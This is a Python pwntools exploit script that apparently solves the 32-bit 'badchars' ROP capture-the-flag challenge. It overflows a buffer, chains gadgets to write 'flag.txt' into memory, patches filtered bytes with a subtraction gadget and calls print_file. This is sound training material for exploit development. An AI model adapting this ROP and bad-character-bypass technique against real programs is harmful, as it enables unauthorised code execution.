from pwn import *

"""
Task:
    1. Finding badchar 
        badchar => 0x2e, 0x61, 0x67, 0x78
    2. Store flag.txt to file_name
        file_name = 0x0804a400
    3. fix badchars in file_name
    2. print_file(file_name)
checkseec:
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'

vmmap: 
    0x08048000 0x08049000 r-xp      /mnt/d/eCXD/rop/X86/badchars/badchars32
    0x08049000 0x0804a000 r--p      /mnt/d/eCXD/rop/X86/badchars/badchars32
    0x0804a000 0x0804b000 rw-p      /mnt/d/eCXD/rop/X86/badchars/badchars32
    0xf7f5f000 0xf7f60000 r-xp      /mnt/d/eCXD/rop/X86/badchars/libbadchars32.so
    0xf7f60000 0xf7f61000 r--p      /mnt/d/eCXD/rop/X86/badchars/libbadchars32.so
    0xf7f61000 0xf7f62000 rw-p      /mnt/d/eCXD/rop/X86/badchars/libbadchars32.so
    0xf7f62000 0xf7f64000 rw-p      mapped
    0xf7f64000 0xf7f67000 r--p      [vvar]
    0xf7f67000 0xf7f68000 r-xp      [vdso]
    0xfffc9000 0xfffea000 rw-p      [stack]

Gadget:
    0x0804854f : mov dword ptr [edi], esi ; ret
    0x080485b9 : pop esi ; pop edi ; pop ebp ; ret

    0x0804854b : sub byte ptr [ebp], bl ; ret
    0x0804839d : pop ebx ; ret
    0x080485bb : pop ebp ; ret


    badChars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
    b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
    b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
    b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
    b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
    b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
    b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
    b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
    b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
    b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
    b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
    b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
    b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )

Stack: 
"""
def write4(where, what):
    g = b""
    g += p32(0x080485b9) #pop esi ; pop edi ; pop ebp ; ret
    g += p32(what)
    g += p32(where)
    g += b"AAAA"
    g += p32(0x0804854f) # mov dword ptr [edi], esi ; ret
    return g

def fix_bad(where, what):
    """
        badchars are: 'x', 'g', 'a', '.'
        badchar => 0x2e, 0x61, 0x67, 0x78
            badchar wil replace with: 0xeb
        Gadget:
            0x0804854b : sub byte ptr [ebp], bl ; ret
            0x0804839d : pop ebx ; ret
            0x080485bb : pop ebp ; ret
        Strategy:
            what = 0xeb - X
            X = 0xeb - what
    """
    what = 0xeb - what
    g = b"" 
    g += p32(0x0804839d)    #pop ebx
    g += p32(what)
    g += p32(0x080485bb)    #pop ebp
    g += p32(where)
    g += p32(0x0804854b)    #sub byte ptr [ebp], bl ; ret
    return g

def exploit():
    """

    """
    p = process("badchars32")
    # proc.wait_for_debugger(p.pid)

    file_name = 0x0804a400
    print_file = 0x080483d0

    flag_str_1 = u32("flag")
    flag_str_2 = u32(".txt")


    buf = b""
    buf += b"A"*0x2c
    buf += write4(file_name, flag_str_1)        # file_name+2 = a, file_name+3 = g
    buf += write4(file_name+4, flag_str_2)      # file_name+4 = ., file_name+6 = x

    # fix badchar
    buf += fix_bad(file_name+2, ord('a'))
    buf += fix_bad(file_name+3, ord('g'))
    buf += fix_bad(file_name+4, ord('.'))
    buf += fix_bad(file_name+6, ord('x'))
    
    # call print_file
    buf += p32(print_file)
    buf += b"AAAA"
    buf += p32(file_name)

    print("[!] Send payload...")
    p.send(buf)
    p.interactive()
exploit()